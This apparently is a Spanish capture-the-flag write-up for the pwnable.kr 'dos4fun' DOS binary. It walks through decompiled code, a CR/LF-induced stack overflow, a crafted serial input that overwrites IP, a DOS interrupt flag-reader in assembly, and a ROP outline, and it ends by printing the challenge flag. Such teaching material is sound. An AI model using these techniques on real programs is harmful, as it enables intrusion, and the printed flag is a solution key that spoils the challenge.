# dos4fun

![img](https://raw.githubusercontent.com/Calana2/Wargame_Writeups/refs/heads/main/pwnable.kr/Hackers_Secret/dos4fun.png)

*En remoto es mejor usar telnet en lugar de netcat porque el programa espera CR/LF y netcat solo devuelve salto de linea.*

De [Operating Systems: Three Easy Pieces, Chapter 2: Introduction to Operating Systems](https://pages.cs.wisc.edu/~remzi/OSTEP/intro.pdf):
```
Early operating systems such as DOS (the Disk Operating System, from Microsoft) didn’t think memory protection was important; thus, a malicious (or perhaps just a poorly-programmed) application could scribble all over memory.
```

Sin embargo parece que en este reto no nos queda de otra que explotarlo para leer la flag, no tenemos acceso a la terminal.

La salida de `strings` muestra esto:
```
Borland C++ - Copyright 1991 Borland Intl.
Null pointer assignment
Divide error
Abnormal program termination
error, fp is 0
fp is valid : %x
keys
can't create file
Enter 25 serial numbers :
%d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d
keys saved into file
keys
can't open file
keys
can't open file
keys are encrypted
User id :
%64s
capturetheflag
Wow.. how did you managed to get here? anyway pwnme and read the flag!
wrong serial
         !!!!!
@@@@@@@@@@@@@@@
@@@@@@@
@@@@@@
@@@@
```

Para depurar usé `DOSBox` con [DEBUG.COM](https://thestarman.pcministry.com/asm/debug/debug.htm), y para análisis estático, Ghidra. Inspeccionando los offsets en DOSBox y actualizando el codigo en Ghidra llegué a funciones legibles.

Para alcanzar la funcion vulnerable hay que primero introducir correctamente una id de usuario y numeros de serie correctos.

La id es "capturetheflag":
```C

undefined2 __cdecl16near FUN_1000_0590___Main(vo id)

{
  int val;
  undefined2 ret;
  undefined buffer [64];
  
                    /* User id : */
  FUN_1000_29a8___printf(0x1a8);
                    /* %64s */
  FUN_1000_2d65___scanf(0x1b3,buffer);
  FUN_1000_21c5(0x328);
  val = FUN_1000_2e86____Verify_ID(buffer,0x1b8);
  if (val == 0) {
    FUN_1000_02df___Create_And_Write_Keyfile();
    FUN_1000_04f9___Encrypt_Keyfile();
    val = FUN_1000_03a2___Verify_Serial();
    if (val == 0) {
                    /* Wrong Serial */
      ret = 0x20f;
    }
    else {
                    /* Wow.. how did you managed to get here ? anyway pwnme and read the flag! */
      ret = 0x1c7;
    }
    FUN_1000_29a8___printf(ret);
    FUN_1000_18ce();
    ret = 1;
  }
  else {
    ret = 0;
  }
  return ret;
}

int __cdecl16near FUN_1000_2e86____Verify_ID(char * buffer,char *data_str)

{
  char *pcVar1;
  char *pcVar2;
  uint uVar3;
  char *pcVar4;
  
  uVar3 = 0xffff;
  pcVar4 = data_str;
  do {
    if (uVar3 == 0) break;
    uVar3 = uVar3 - 1;
    pcVar1 = pcVar4;
    pcVar4 = pcVar4 + 1;
  } while (*pcVar1 != '\0');
  uVar3 = ~uVar3;
  do {
    if (uVar3 == 0) break;
    uVar3 = uVar3 - 1;
    pcVar2 = data_str;
    data_str = data_str + 1;
    pcVar1 = buffer;
    buffer = buffer + 1;
  } while (*pcVar1 == *pcVar2);
  return (uint)(byte)buffer[-1] - (uint)(byte)data_str[-1];
}
```

El programa nos pide 25 números serie que almacena en un archivo llamado "keys":
```C

undefined2 __cdecl16near FUN_1000_02df___Create_ And_Write_Keyfile(void)

{
  int fd;
  
                    /* open("keys","w") */
  fd = FUN_1000_23ed___open(0xcc,0xd1);
  if (fd == 0) {
                    /* Cant create file
                        */
    FUN_1000_29a8___printf(0xd3);
    FUN_1000_0698___exit(0);
  }
                    /* Enter 25 serial numbers : */
  FUN_1000_29a8___printf(0xe6);
                    /* "%d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d"
                        */
  FUN_1000_2d65___scanf
            (0x101,0x656,0x658,0x65a,0x65c,0x65e,0x660, 0x662,0x664,0x666,0x668,0x66a,0x66c,0x66e,
             0x670,0x672,0x674,0x676,0x678,0x67a,0x67c, 0x67e,0x680,0x682,0x684,0x686);
                    /* fwrite(buff,2,25,fd) */
  FUN_1000_2636___fwrite(0x656,2,0x19,fd);
  FUN_1000_2150___close(fd);
                    /* keys saved into file */
  FUN_1000_29a8___printf(0x14c);
  return 0;
}
```

Luego hace un XOR con una clave fija (0xff) para encriptarlos y actualizar "keys":
```C

void __cdecl16near FUN_1000_04f9___Encrypt_Keyfile( void)

{
  int fd;
  int len;
  int chunk;
  undefined2 i;
  
                    /* open("keys","rb+") */
  fd = FUN_1000_23ed___open(0x17a,0x17f);
  if (fd == 0) {
                    /* "cant open file" */
    FUN_1000_29a8___printf(0x183);
    FUN_1000_0698___exit(0);
  }
  len = FUN_1000_0291___filelength(fd);
  chunk = FUN_1000_1b5a___malloc(len);
  FUN_1000_24df___fread(chunk,1,len,fd);
  for (i = 0; i < len; i = i + 1) {
    *(byte *)(i + chunk) = *(byte *)(i + chunk) ^ 0xff;
  }
  FUN_1000_2587___lseek(fd,0,0,0);
  FUN_1000_2636___fwrite(chunk,1,len,fd);
  FUN_1000_2150___close(fd);
  FUN_1000_1a8b___free(chunk);
                    /* "keys are encrypted" */
  FUN_1000_29a8___printf(0x194);
  return;
}
```

Por último, esta es la verificación de los seriales que debemos pasar:
```C
undefined2 __cdecl16near FUN_1000_03a2___Verify_Serial(void)
{
  int fd;
  undefined2 len;
  uint local_34;
  uint local_32;
  uint local_30;
  uint local_2e;
  uint local_2c;
  uint local_2a;
  uint local_28;
  uint local_26;
  uint local_24;
  uint local_22;
  uint local_20;
  uint local_1e;
  uint local_1c;
  uint local_1a;
  uint local_18;
  uint local_16;
  uint local_14;
  uint local_12;
  uint local_10;
  uint local_e;
  uint local_c;
  uint local_a;
  uint local_8;
  uint local_6;
  uint local_4;
  
                    /* open("keys","r") */
  fd = FUN_1000_23ed___open(0x162,0x167);
  if (fd == 0) {
                    /* "cant open file" */
    FUN_1000_29a8___printf(0x169);
    FUN_1000_0698___exit(0);
  }
  len = FUN_1000_0291___filelength(fd,fd);
  FUN_1000_24df___fread(&local_34,1,len);
  FUN_1000_2150___close(fd);
  if ((((((((local_34 < local_32) && (local_32 < local_30)) && (local_30 < local_2e)) &&
         (((local_2e < local_2c && (local_2c < local_2a)) &&
          ((local_2a < local_28 && ((local_28 < local_26 && (local_26 < local_24)))))))) &&
        (local_24 < local_22)) &&
       (((((local_22 < local_20 && (local_20 < local_1e)) & & (local_1e < local_1c)) &&
         ((local_1c < local_1a && (local_1a < local_18)))) & &
        ((local_18 < local_16 && ((local_16 < local_14 && ( local_14 < local_12)))))))) &&
      ((local_12 < local_10 &&
       (((local_10 < local_e && (local_e < local_c)) && (loc al_c < local_a)))))) &&
     (((local_a < local_8 && (local_8 < local_6)) && ((local _6 < local_4 && (local_4 < local_34)))))
     ) {
    len = 1;
  }
  else {
    len = 0;
  }
  return len;
}
```

`local_34` vendria siendo el primer serial y `local_4` el ultimo. El programa espera una lista en orden ascendente: "a < b < c < d..." pero tambien que el ultimo sea menor que el primero, lo que es una contradiccion.

## Vulnerabilidad

El archivo se abre en modo texto para escritura y convierte "\n" en "\r\n". Si introducimos "10 10 10 10..." el archivo 'keys' luce así
```
 xxd KEYS
00000000: f2f5 fff2 f5ff f2f5 fff2 f5ff f2f5 fff2  ................
00000010: f5ff f2f5 fff2 f5ff f2f5 fff2 f5ff f2f5  ................
00000020: fff2 f5ff f2f5 fff2 f5ff f2f5 fff2 f5ff  ................
00000030: f2f5 fff2 f5ff f2f5 fff2 f5ff f2f5 fff2  ................
00000040: f5ff f2f5 fff2 f5ff f2f5 ff              ...........
└─$ python3
Python 3.13.9 (main, Oct 15 2025, 14:56:22) [GCC 15.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(0xf2f5 ^ 0xffff)
'0xd0a'
```

`fwrite` escribe un retorno de carro antes de cualquier salto de línea solo que encuentre, entonces en `FUN_1000_03a2___Verify_Serial` vemos que tiene como variables locales los 25 enteros de 16 bits que se introducen xoreados con 0xffff (esto es igual a negarlos), por lo que por cada "\n" escrito es un overflow de un byte. Con 2 bytes se sobreescribe BP y con 4 IP.

Ejemplo: `10 10 10 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 -16706` sobreescribe IP con 0x4141. 
```
~0x4141 = -16706             <--- cualquiera de estos dos valores sirve
0x4141 ^ 0xffff = 48830      <---
```

## Exploit

Para leer la flag debemos hacer un open-read-write con [las interrupciones del sistema](https://www.gabrielececchetti.it/Teaching/CalcolatoriElettronici/Docs/i8086_and_DOS_interrupts.pdf), un ejemplo es este programa que lee el archivo "flag" y lo imprime en pantalla:
``` asm
; COM file
; nasm -f bin reader.asm -o READER.COM
BITS 16

org 0x100

section .data
  filename db "flag",0
  buffer times 250 db 0

section .text
_start:
  ; open file
  mov dx, filename
  ;mov dx, 0x208         ; "flag" offset
  mov ax, 0x3d00        ; open for reading
  int 0x21

  ; read file
  mov bx, ax            ; file handler
  mov cx, 0x20          ; size
  mov dx, buffer
  ;mov dx, 0x0          ; buffer
  mov ah, 0x3f
  int 0x21

  mov si, bx            ; save file handler
                         
  ; write to STDOUT       
  mov bx, 0x1           ; STDOUT
  mov cx, ax            ; num of bytes
  ;mov dx, 0             ; buffer
  mov dx, buffer
  mov ah, 0x40
  int 0x21

  ; close file
  mov bx, si            ; file handler
  mov ah, 0x3e        
  int 0x21

  ; exit
  mov ah, 0x4c
  int 0x21
```

En el reto hay dos formas de lograrlo, ROP y ret2shellcode.

### Shellcode

Es más interesante y un poco más complicado que hacer ROP con lo que tenemos porque para hacer un ret2shellcode aquí hay que hacer un "intersegment branch", o lo que es lo mismo, tenemos que ajustar tanto el registro de segmento CS como el desplazamiento IP. Para eso se debe localizar un byte `0xcb` que es la instrucción `retf` o "far return". Según [esta entrada para referencia](https://www.felixcloutier.com/x86/ret):
```
The RET instruction can be used to execute three different types of returns:
    Near return: A return to a calling procedure within the current code segment (the segment currently pointed to by the CS register), sometimes referred to as an intrasegment return.
    Far return: A return to a calling procedure located in a different segment than the current code segment, sometimes referred to as an intersegment return.
    Inter-privilege-level far return: A far return to a different privilege level than that of the currently executing program or procedure.

When executing a far return, the processor pops the return instruction pointer from the top of the stack into the EIP register, then pops the segment selector from the top of the stack into the CS register. 
The processor then begins program execution in the new code segment at the new instruction pointer.
```

Para bien o para mal alguien no respetó las normas del sitio y creó un [walktrough público en Youtube](https://www.youtube.com/watch?v=N0FdQGyJ7a0).
### ROP

ROP con las funciones existentes se puede lograr mediante fopen-fread-builtin_printf. 

Es técnicamente casi idéntico al x86, la convención de llamadas hace que el caller tenga que limpiar la pila, y usamos gadgets pop ret para ello.

En esencia: `fopen('flag','r')`, `fread(buf,1,0xNN,0x378)`, `printf(buf)`

El fd o manejador de archivo es 0x378 porque el programa lo filtra al interactuar con el archivo 'keys'.

`buf` es cualquier dirección de las cadenas 'Wrong Serial' o 'WoW...', que aprovechamos ya que el `printf` en `FUN_1000_0590___Main` los carga y los imprime si saltamos en medio de la función.

`W1ndows_N3wl1n3_1s_c0nfusiNg`

